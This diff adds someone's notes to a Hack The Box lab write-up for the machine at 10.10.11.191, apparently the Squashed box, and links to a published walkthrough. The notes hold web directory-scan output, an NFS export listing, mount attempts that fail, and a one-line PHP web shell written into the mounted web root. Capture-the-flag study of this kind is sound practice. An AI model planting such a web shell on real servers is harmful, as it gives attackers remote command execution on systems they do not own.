@@ -13,4 +13,45 @@ PORT     STATE    SERVICE
 5678/tcp filtered rrac
 7402/tcp filtered rtps-dd-mt
 
+[####################] - 0s     30000/30000   0/s     http://10.10.11.191/images/ => Directory listing (add -e to scan)
+[####################] - 0s     30000/30000   0/s     http://10.10.11.191/js/ => Directory listing (add -e to scan)
+[####################] - 0s     30000/30000   0/s     http://10.10.11.191/css/ => Directory listing (add -e to scan)
+403      GET        9l       28w      277c http://10.10.11.191/server-status
 
+![](20230221130100.png)  
+
+```
+┌──(kali㉿kali)-[~/drupwn]
+└─$ showmount -e 10.10.11.191       
+Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *
+
+```
+
+unable to mount
+
+```
+┌──(root㉿kali)-[/home/kali/drupwn]
+└─# mount -t nfs 10.10.111.191:/home/ross /mnt
+^C
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali/drupwn]
+└─# mount -t nfs 10.10.111.191:/var/www/html /mnt
+^C
+                                                   
+```
+
+php command line
+
+```
+dummy@hacky:/$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' 
+<?php
+  system($_REQUEST[cmd]);
+?>
+dummy@hacky:/$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/0xdf.php
+
+
+```
+
+https://0xdf.gitlab.io/2022/11/21/htb-squashed.html
